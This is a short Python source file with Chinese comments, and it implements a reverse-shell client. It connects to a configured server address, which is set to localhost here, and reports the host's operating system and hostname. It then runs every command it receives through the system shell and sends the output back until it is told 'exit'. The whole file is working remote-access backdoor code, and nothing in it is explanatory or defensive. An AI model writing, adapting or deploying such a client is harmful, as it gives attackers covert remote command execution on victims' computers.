import socket
import subprocess
import platform
import os

# 配置
SERVER_IP = '127.0.0.1'
SERVER_PORT = 50000

def get_system_info():
    """获取系统类型和主机名"""
    return f"{platform.system()}|{socket.gethostname()}"

def run_command(command):
    """执行系统命令"""
    try:
        # 使用 shell=True 执行命令
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('gbk' if platform.system() == 'Windows' else 'utf-8')
    except subprocess.CalledProcessError as e:
        return e.output.decode('gbk' if platform.system() == 'Windows' else 'utf-8')
    except Exception as e:
        return str(e)

def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((SERVER_IP, SERVER_PORT))
        
        # 1. 连接后立即发送系统信息
        info = get_system_info()
        client.send(info.encode('utf-8'))

        while True:
            # 2. 等待接收服务端命令
            command = client.recv(4096).decode('utf-8')
            if not command or command.lower() == 'exit':
                break
            
            # 3. 执行并返回结果
            result = run_command(command)
            if not result: result = "命令已执行，无回显。"
            client.send(result.encode('utf-8'))
            
    except Exception as e:
        print(f"连接断开: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    start_client()